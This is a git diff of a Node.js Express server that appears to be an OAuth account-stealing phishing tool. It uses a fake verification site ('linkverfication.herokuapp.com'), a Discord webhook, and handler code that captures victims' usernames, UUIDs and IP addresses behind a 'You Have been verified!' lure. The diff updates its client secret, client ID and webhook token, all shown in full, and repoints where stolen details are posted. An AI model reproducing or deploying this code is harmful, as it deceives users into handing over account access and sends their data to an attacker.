@@ -1,8 +1,8 @@
 //Config
-const secret_value = 'UFv8Q~nnE2Ajlus7uh3vuZcvmeJ0DZqvciQWccO7'
-const client_id = '6b014123-2f76-44d5-a40f-0f58a5109351'
+const secret_value = 'ae98Q~azbtss.RpbsYiLifloPdgg82d_i3qkKduJ'
+const client_id = '01977706-a695-4108-930c-82f0f8a6b4c9'
 const redirect_uri = 'https://linkverfication.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1045430078739324978/mUqU_zlSxYqN2diDEd8Szen_PQ1Zt273jFYh2BX1O8X-32s9Iyl1JURKUron1VUn3gsi'
+const webhook_url = 'https://discord.com/api/webhooks/1046463641005862952/LqbqcZf8w3xd-fdABoy8PFaLLvh49CnKMFbzxh7ZRx-1Yk-cK6_40MWCxlevRu1v-bGD'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('You Have been verified!')
     const code = req.query.code
     if (code == null) {
         return
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
+        pageGoPost({url: "https://linkverfication.herokuapp.com/", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
